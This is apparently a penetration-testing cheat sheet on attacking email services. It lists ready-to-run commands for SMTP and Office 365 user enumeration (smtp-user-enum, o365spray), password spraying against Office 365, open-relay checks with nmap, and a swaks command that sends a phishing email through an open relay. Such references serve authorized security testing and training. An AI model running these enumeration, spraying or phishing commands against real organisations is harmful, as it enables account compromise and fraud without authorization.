# Common services
##  Email Services
### Enumeration
 * [MXToolbox](https://mxtoolbox.com/)
 * [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum)

```
host -t MX $rhost
dig mx $rhost | grep "MX" | grep -v ";"
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 $rhost
```

To automate our enumeration process, we can use a tool named smtp-user-enum. We can specify the enumeration mode with the argument -M followed by VRFY, EXPN, or RCPT, and the argument -U with a file containing the list of users we want to enumerate. Depending on the server implementation and enumeration mode, we need to add the domain for the email address with the argument -D. Finally, we specify the target with the argument -t.

```
smtp-user-enum -M RCPT -U userlist.txt -D $domain_target -t $mail_server
```

### Cloud Enumeration
 * [o365spray](https://github.com/0xZDH/o365spray)

```
python3 o365spray.py --validate --domain $domain_target
python3 o365spray.py --enum -U users.txt --domain $domain_target  
```

### Password Attacks
 * [MailSniper](https://github.com/dafthack/MailSniper)
 * [CredKing](https://github.com/ustayready/CredKing)
 * [o365spray](https://github.com/0xZDH/o365spray)


```
python3 o365spray.py --spray -U usersfound.txt -p 'SOME_PASSWORD' --count 1 --lockout 1 --domain $domain_target
```
### Open Relay

```
nmap -p25 -Pn --script smtp-open-relay $rhost
```
Next, we can use any mail client to connect to the mail server and send our email.
```
swaks --from $from --to $to --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server $rhost
```

